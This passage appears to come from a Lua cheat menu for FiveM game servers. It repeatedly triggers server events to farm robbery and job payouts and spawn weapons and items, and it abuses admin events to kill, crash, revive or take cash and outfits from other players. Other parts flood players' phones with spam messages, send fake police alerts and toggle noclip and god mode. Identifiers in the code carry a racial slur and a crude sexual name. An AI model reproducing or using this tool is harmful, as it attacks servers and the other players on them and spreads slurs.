				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("l2s-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("AT-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('yas-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('55-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('l2s-storerobbery:server:rob:register',RegisterId,true)
                TriggerServerEvent('AT-storerobbery:server:rob:register',RegisterId,true)
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:vitrineReward')
				TriggerServerEvent('mr-weponsrobby:server:CombatReward')
				TriggerServerEvent('mr-weponsrobby:server:HeavyReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
				TriggerServerEvent('55-jewellery:server:vitrineReward')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
                TriggerServerEvent('RoutePizza:Payment')
			elseif IhadSexWithMyStepMother.Button("~r~ﺪﻳﺪﺟ ~k~ ﺲﺑﻼﻤﻟﺍ ﻆﻔﺣ") then
				TriggerServerEvent("yas-outfits:server:openUI",true)
				TriggerServerEvent("55-outfits:server:openUI",true)
				TriggerServerEvent("ipx-outfits:server:openUI",true)
				TriggerServerEvent("AT-outfits:server:openUI",true)
				TriggerServerEvent("l2s-outfits:server:openUI",true)
				TriggerServerEvent("i2s-outfits:server:openUI",true)
				TriggerServerEvent("mr-outfits:server:openUI",true)
				TriggerServerEvent("Ks-outfits:server:openUI",true)
				TriggerServerEvent("drk-outfits:server:openUI",true)
			elseif IhadSexWithMyStepMother.Button("~r~ﺪﻳﺪﺟ ~k~ Finger Print For All") then
				TriggerServerEvent('police:server:showFingerprintId',-1)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~k~Finger Print By ID") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent('police:server:showFingerprintId',hM)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~r~ﺔﻳﻮﻟﻭﻷﺍ ﻲﻔﻄﺗ") then
				TriggerServerEvent('cancelcooldown')
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~r~ﺔﻳﻮﻟﻭﻷﺍ ﻞﻐﺸﺗ") then
				TriggerServerEvent('cooldownt')
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~r~ﺔﻳﻮﻟﻭﻷﺍ ﺖﺒﺜﺗ") then
				TriggerServerEvent('cooldownt')
			elseif IhadSexWithMyStepMother.Button("~b~ﻚﻨﺑ ﺔﻗﺮﺳ ﺽﺍﺮﻏﺍ ﺬﺧﺍ") then
				TriggerServerEvent("QBCore:Server:AddItem", "bank_card", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "fleecacard", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "fleecacard2", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "trojan_usb", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "electronickit", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "advancedlockpick", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "bank_card", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "fleecacard", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "fleecacard2", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "trojan_usb", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "electronickit", 1)
				TriggerServerEvent("ipx-Core:Server:AddItem", "advancedlockpick", 1)
			elseif IhadSexWithMyStepMother.Button("~w~CFW AMX ITEMS") then
				TriggerServerEvent("QBCore:Server:AddItem", "advancedlockpick", 5)
				TriggerServerEvent("QBCore:Server:AddItem", "lockpick", 4)
				TriggerServerEvent("QBCore:Server:AddItem", "handcuffs", 2)
				TriggerServerEvent("QBCore:Server:AddItem", "pistol_ammo", 60)
				TriggerServerEvent("QBCore:Server:AddItem", "radio", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "pistol_suppressor", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "screwdriverset", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol_mk2", 1)
				TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol50", 1)
			elseif IhadSexWithMyStepMother.Button("~r~ﻦﻴﺒﻋﻷﺍ ﻞﻛ ﻞﺘﻗ") then
				TriggerServerEvent("qb-admin:server:killPlayer", -1)
				TriggerServerEvent("ipx-admin:server:killPlayer", -1)
				TriggerServerEvent("55-admin:server:killPlayer", -1)
				TriggerServerEvent("yas-admin:server:killPlayer", -1)
				TriggerServerEvent("l2s-admin:server:killPlayer", -1)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~r~ﻱﺪﻳﺍ ﻖﻳﺮﻃ ﻦﻋ ﺢﺑﺬﺗ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("qb-admin:server:killPlayer", hM)
				TriggerServerEvent("ipx-admin:server:killPlayer", hM)
				TriggerServerEvent("55-admin:server:killPlayer", hM)
				TriggerServerEvent("yas-admin:server:killPlayer", hM)
				TriggerServerEvent("l2s-admin:server:killPlayer", hM)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~t~ﺐﻋﻻ ﺵﺮﻜﺗ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent('55-admin:server:crash', hM)
				TriggerServerEvent('AT-admin:server:crash', hM)
				TriggerServerEvent('yas-admin:server:crash', hM)
				TriggerServerEvent('l2s-admin:server:crash', hM)
				TriggerServerEvent('mr-admin:server:crash', hM)
				TriggerServerEvent('drk-admin:server:crash', hM)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~t~ﻦﻴﺒﻋﻷﺍ ﻞﻛ ﺵﺮﻜﺗ") then
				TriggerServerEvent('55-admin:server:crash', -1)
				TriggerServerEvent('AT-admin:server:crash', -1)
				TriggerServerEvent('yas-admin:server:crash', -1)
				TriggerServerEvent('l2s-admin:server:crash', -1)
				TriggerServerEvent('mr-admin:server:crash', -1)
				TriggerServerEvent('drk-admin:server:crash', -1)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~b~ﻞﻔﻟ ﺔﻓﺎﺿﺍ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("QBCore:Server:SetMetaData", "craftingrep", hM)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~b~ﻞﻔﻟ 005 ﺔﻓﺎﺿﺍ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("QBCore:Server:SetMetaData", "craftingrep", 500)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~t~ﺐﻋﻻ ﻦﻜﺳ ﺬﺧﺄﺗ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("raid_clothes:stealOutfit", hM)
				TriggerServerEvent("55-clothes:stealOutfit", hM)
				TriggerServerEvent("l2s-clothes:stealOutfit", hM)
				TriggerServerEvent("yas-clothes:stealOutfit", hM)
				TriggerServerEvent("Drk-clothes:stealOutfit", hM)
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~y~ﺔﺒﺗﺭ ﺬﺧﺄﺗ") then
				local hM = e9("Enter job name ID:")
				TriggerServerEvent("l2s-cityhall:server:ApplyJob", "hM")
			elseif IhadSexWithMyStepMother.Button("~g~ﺪﻳﺪﺟ ~r~ﻦﻴﺒﻋﻷﺍ ﻞﻛ ﺡﺮﻄﺗ") then
				TriggerServerEvent("tackle:server:TacklePlayer", -1)
			elseif IhadSexWithMyStepMother.Button("~g~ﻊﻴﻤﺠﻟﺍ ﺶﻌﻨﺗ") then
				TriggerServerEvent("qb-admin:server:revivePlayer", -1)
				TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
				TriggerServerEvent('55-admin:server:revivePlayer',-1)
				TriggerServerEvent('AT-admin:server:revivePlayer',-1)
				TriggerServerEvent('mr-admin:server:revivePlayer',-1)
				TriggerServerEvent('bb-admin:server:revivePlayer',-1)
				TriggerServerEvent('Ks-admin:server:revivePlayer',-1)
				TriggerServerEvent('Drk-admin:server:revivePlayer',-1)
				TriggerServerEvent("hospital:server:RevivePlayer",-1)
			elseif IhadSexWithMyStepMother.Button("~y~ﻊﻴﻤﺠﻠﻟ ﺲﺑﻼﻤﻟﺍ ﺔﻤﺋﺎﻗ ﺢﺘﻔﺗ") then
				TriggerServerEvent("bw-admin:server:OpenSkinMenu", -1)
				TriggerServerEvent("qb-admin:server:OpenSkinMenu", -1)
				TriggerServerEvent("ipx-admin:server:OpenSkinMenu", -1)
				TriggerServerEvent("drk-admin:server:OpenSkinMenu", -1)
				TriggerServerEvent('AT-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('mr-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('l2s-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('55-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('yas-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('ks-admin:server:OpenSkinMenu',-1)
				TriggerServerEvent('Drk-admin:server:OpenSkinMenu',-1)
			elseif IhadSexWithMyStepMother.Button("~p~ﺔﻃﺮﺸﻠﻟ ﺭﺎﻌﺷﺍ ﻞﺳﺮﺗ") then
				TriggerServerEvent("txaLogger:DeathNotice", killer, deathResean)
				TriggerServerEvent("qb-bankrobbery:server:callCops", "pacific", 0, streetLabel, pos)
				TriggerServerEvent("qb-bankrobbery:server:callCops", "paleto", 0, streetLabel, pos)
				TriggerServerEvent("police:server:GunshotAlert", streetLabel, pacific, true, policestaion, vehicleInfo)
				TriggerServerEvent("prison:server:SecurityLockdown")
				TriggerEvent("police:SetCopAlert")
				TriggerServerEvent("qb-drugs:server:callCops", streetLabel, pos)
				TriggerServerEvent("qb-jewellery:server:PoliceAlertMessage", "AmX#4083", plyCoords, false)
				TriggerServerEvent("qb-jewellery:server:PoliceAlertMessage", "AmX#4083", plyCoords, true)
				TriggerEvent("chatMessage", "AmX#4083", "AmX#4083", msg)
				TriggerServerEvent("police:server:VehicleCall", pos, msg, alertTitle, streetLabel, modelPlate, Name)
			elseif IhadSexWithMyStepMother.Button("~f~ﻦﻳﺰﻧﺎﺑ ﺓﺭﺎﻴﺴﻟﺍ ﻲﺒﻌﺗ") then
				TriggerServerEvent("fuel:pay", 0)
			elseif IhadSexWithMyStepMother.Button("~c~ﻱﺪﻳﺍ ﺔﻘﻳﺮﻃ ﻦﻋ ﺶﻌﻨﺗ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("hospital:server:RevivePlayer", hM)
				TriggerServerEvent("qb-admin:server:revivePlayer", hM)
				TriggerServerEvent("ipx-admin:server:revivePlayer", hM)
				TriggerServerEvent("l2s-admin:server:revivePlayer", hM)
				TriggerServerEvent("55-admin:server:revivePlayer", hM)
				TriggerServerEvent("yas-admin:server:revivePlayer", hM)
				TriggerServerEvent("AT-admin:server:revivePlayer", hM)
				TriggerServerEvent('Ks-admin:server:revivePlayer', hM)
				TriggerServerEvent('Drk-admin:server:revivePlayer', hM)
			elseif IhadSexWithMyStepMother.Button("~k~ﺐﻋﻻ ﻱﺍ ﺵﺎﻛ ﺬﺧﺎﺗ") then
				local hM = e9("Enter Player ID:")
				TriggerServerEvent("police:server:SeizeCash", hM)
			elseif IhadSexWithMyStepMother.Button("~l~ﻦﻣﺩﻷﺍ ﺔﻤﺋﺎﻗ ﺢﺘﻔﺗ") then
				TriggerEvent("qb-admin:client:openMenu", source, group, dealers)
				TriggerEvent("ipx-admin:client:openMenu", source, group, dealers)
				TriggerEvent("55-admin:client:openMenu", source, group, dealers)
				TriggerEvent("yas-admin:client:openMenu", source, group, dealers)
				TriggerEvent("l2s-admin:client:openMenu", source, group, dealers)
				TriggerEvent("ks-admin:client:openMenu", source, group, dealers)
			elseif IhadSexWithMyStepMother.Button("~d~ﺔﺒﻴﻘﺣ ﺢﺘﻔﺗ") then
				local hM = e9("Enter Player Server ID:")
				TriggerServerEvent("inventory:server:OpenInventory","otherplayer", hM)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vrp") then
			if IhadSexWithMyStepMother.Button("~b~ﺔﺸﺒﻠﻛ / ﺔﺸﺒﻠﻛ ﻚﻓ") then
				vRP.toggleHandcuff()
						elseif IhadSexWithMyStepMother.Button("~e~ﻲﻛ ﻱﺍ ﺬﺧﺎﺗ") then
				GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('weapon_assaultrifle'), 150, false, true)
				
			elseif IhadSexWithMyStepMother.Button("~d~ﻝﻮﺘﺴﻴﺑ ﻲﺑ ﻱﺍ ﺬﺧﺎﺗ") then
				GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 150, false, true)
			
			elseif IhadSexWithMyStepMother.Button("~y~ﺮﺒﻳﺎﻨﺳ ﺬﺧﺎﺗ") then
			    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('weapon_heavysniper'), 150, false, true)

			elseif IhadSexWithMyStepMother.Button("~g~ﻑﻮﺸﻜﻣ ﺮﻴﻏ ﻥﺍﺮﻴﻃ") then
				vRP.toggleNoclip()
			end
			
		elseif IhadSexWithMyStepMother.IsMenuOpened("settingslol") then
		
			if IhadSexWithMyStepMother.MenuButton("Credits", "credits") then
			end;
			if IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~X', ct, cp, cq, function(aD, aE)
				cp = aD;
				cq = aD;
				for i = 1, #menulist do
					IhadSexWithMyStepMother.SetMenuX(menulist[i], ct[cp])
				end
			end) then
			elseif IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~Y', cu, cr, cs, function(aD, aE)
				cr = aD;
				cs = aD;
				for i = 1, #menulist do
					IhadSexWithMyStepMother.SetMenuY(menulist[i], cu[cr])
				end
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("credits") then
			for av, hA in pairs(b7) do
				if IhadSexWithMyStepMother.Button(hA[1], hA[2]) then
				end
			end
		elseif IsDisabledControlJustReleased(0, cn[menuKeybind]) then
			IhadSexWithMyStepMother.OpenMenu("StupidNiggaPaster")
		elseif IsDisabledControlPressed(0, cn[menuKeybind2]) then
			IhadSexWithMyStepMother.OpenMenu("StupidNiggaPaster")
		elseif IsControlJustReleased(0, cn[noclipKeybind]) then
			f7()
		elseif IsControlJustReleased(0, cn[teleportKeyblind]) then
			f0()
		elseif IsControlJustReleased(0, cn[fixvaiculoKeyblind]) then
			eu()
		end;
		IhadSexWithMyStepMother.Display()
		if Demigod then
			if GetEntityHealth(PlayerPedId()) < 200 then
				SetEntityHealth(PlayerPedId(), 200)
			end
		end;
		if ADemigod then
			SetEntityHealth(PlayerPedId(), 189.9)
		end;
		if Noclipping then
			local hN = IsPedInAnyVehicle(PlayerPedId(), 0)
			local cP = nil;
			local x, y, z = nil;
			if not hN then
				cP = PlayerPedId()
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
			else
				cP = GetVehiclePedIsIn(PlayerPedId(), 0)
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
			end;
			if hN and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
				RequestControlOnce(cP)
			end;
			local eD, eE, eF = dg()
			SetEntityVisible(PlayerPedId(), 0, 0)
			SetEntityVisible(cP, 0, 0)
			SetEntityVelocity(cP, 0.0001, 0.0001, 0.0001)
			if IsDisabledControlJustPressed(0, cn["LEFTSHIFT"]) then
				oldSpeed = NoclipSpeed;
				NoclipSpeed = NoclipSpeed * 2
			end;
			if IsDisabledControlJustReleased(0, cn["LEFTSHIFT"]) then
				NoclipSpeed = oldSpeed
			end;
			if IsDisabledControlPressed(0, 32) then
				x = x + NoclipSpeed * eD;
				y = y + NoclipSpeed * eE;
				z = z + NoclipSpeed * eF
			end;
			if IsDisabledControlPressed(0, 269) then
				x = x - NoclipSpeed * eD;
				y = y - NoclipSpeed * eE;
				z = z - NoclipSpeed * eF
			end;
			if IsDisabledControlPressed(0, cn["SPACE"]) then
				z = z + NoclipSpeed
			end;
			if IsDisabledControlPressed(0, cn["LEFTCTRL"]) then
				z = z - NoclipSpeed
			end;
			SetEntityCoordsNoOffset(cP, x, y, z, true, true, true)
		end;
		if ExplodingAll then
			ex(gT)
		end;
		if Tracking then
			local bs = GetEntityCoords(GetPlayerPed(gH))
			SetNewWaypoint(bs.x, bs.y)
		end;
		if FlingingPlayer then
			local bs = GetEntityCoords(GetPlayerPed(gJ))
			Citizen.InvokeNative(16405817240112490000, bs.x, bs.y, bs.z, 4, 1.0, 0, 1, 0.0, 1)
		end;
		if InfStamina then
			RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
		end;
		if SuperJump then
			SetSuperJumpThisFrame(PlayerId())
		end;
		if Invisibility then
			SetEntityVisible(PlayerPedId(), 0, 0)
		end;
		if Forcefield then
			eH(ForcefieldRadius)
		end;
		if CarsDisabled then
			local ey = GetActivePlayers()
			for i = 1, #ey do
				if IsPedInAnyVehicle(GetPlayerPed(ey[i]), true) then
					ClearPedTasksImmediately(GetPlayerPed(ey[i]))
				end
			end
		end;
		if GunsDisabled then
			local ey = GetActivePlayers()
			for i = 1, #ey do
				if IsPedShooting(GetPlayerPed(ey[i])) then
					ClearPedTasksImmediately(GetPlayerPed(ey[i]))
				end
			end
		end;
		if NoisyCars then
			for cP in EnumerateVehicles() do
				SetVehicleAlarmTimeLeft(cP, 500)
			end
		end;
		if FlyingCars then
			for cP in EnumerateVehicles() do
				RequestControlOnce(cP)
				ApplyForceToEntity(cP, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end;
		if Enable_GcPhone then
			for i = 0, 450 do
				FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", GetPlayerServerId(i), 5000, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
				FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
				FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", 5000, num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
			end
		end;
		if SuperGravity then
			for cP in EnumerateVehicles() do
				RequestControlOnce(cP)
				SetVehicleGravityAmount(cP, GravAmount)
			end
		end;
		if RainbowVeh then
			local hO = cP(1.0)
			SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
		end;
		if ou328hSync then
			local hO = cP(1.0)
			local ped = PlayerPedId()
			local veh = GetVehiclePedIsUsing(ped)
			SetVehicleNeonLightEnabled(veh, 0, true)
